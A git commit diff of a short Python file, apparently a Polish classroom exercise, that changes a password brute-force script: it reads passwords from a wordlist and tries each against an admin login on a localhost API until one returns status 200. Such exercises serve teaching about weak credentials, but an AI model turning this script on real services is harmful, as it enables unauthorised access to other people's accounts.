049dc13e8cf04ec08fe0a5e276ecd8609e204cf1
Pięćdziesiątka Trygonometryczna <dawidkalinowski243@gmail.com>
2024-04-15 15:24:40 +0200

    zad3

--- zad3.py
+++ zad3.py
@@ -1,13 +1,11 @@
 import requests
 
-username = 'admin'
-api_url = 'http://localhost:3002/'
-
+api_url = 'http://localhost:4000/users?login=admin&pass='
 def brute_force(file_path):
     with open(file_path, 'r') as file:
         for line in file:
             password = line.strip()
-            response = requests.get(api_url, auth=(username, password))
+            response = requests.get(api_url + password)
             if response.status_code == 200:
                 print(f"Znaleziono poprawne hasło: {password}")
                 return
@@ -15,3 +13,6 @@ def brute_force(file_path):
                 print(f"Próba hasła {password} nie powiodła się.")
 
 brute_force('pass.txt')
+
+
+# http://localhost:4000/users?login=admin&pass=123456
